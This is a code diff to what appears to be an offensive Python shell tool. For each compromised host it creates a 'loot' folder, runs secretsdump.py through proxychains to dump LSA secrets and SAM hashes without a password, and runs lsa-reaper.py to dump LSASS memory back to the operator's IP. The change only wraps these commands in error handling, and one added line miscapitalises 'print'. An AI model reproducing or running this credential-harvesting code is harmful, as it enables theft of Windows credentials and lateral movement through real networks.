@@ -142,7 +142,11 @@ class MiniShell(cmd.Cmd):
                             dumped_ips.append(dat[1]) # append the ip to dumped_ips to avoid dumping the same host twice
                             os.system('sudo mkdir {}/loot/{}'.format(cwd, dat[1]))
                             #lsa secrets and sam dump courtesy of secretsdump
-                            os.system('sudo proxychains python3 secretsdump.py {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}/{}\''.format(dat[2], dat[1], cwd, dat[1], dat[1]))
+                            try:
+                                os.system('sudo proxychains python3 secretsdump.py {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}/{}\''.format(dat[2], dat[1], cwd, dat[1], dat[1]))
+                            except Exception as e:
+                                print(str(e))
+                                print('Error dumping secrets')
 
                             #lsass dump with reaper
 
@@ -156,7 +160,12 @@ class MiniShell(cmd.Cmd):
 
 
                             #step 2 start reaper
-                            os.system('sudo python3 lsa-reaper.py {}@{} -oe -ip {} -ap -no-pass'.format(dat[2], dat[1], local_ip))
+                            try:
+                                os.system('sudo python3 lsa-reaper.py {}@{} -oe -ip {} -ap -no-pass'.format(dat[2], dat[1], local_ip))
+                            except Exception as e:
+                                print(str(e))
+                                Print('Error Dumping lsass')
+                                
 
                             #step 3 start servers
                             if not self.serversRunning:
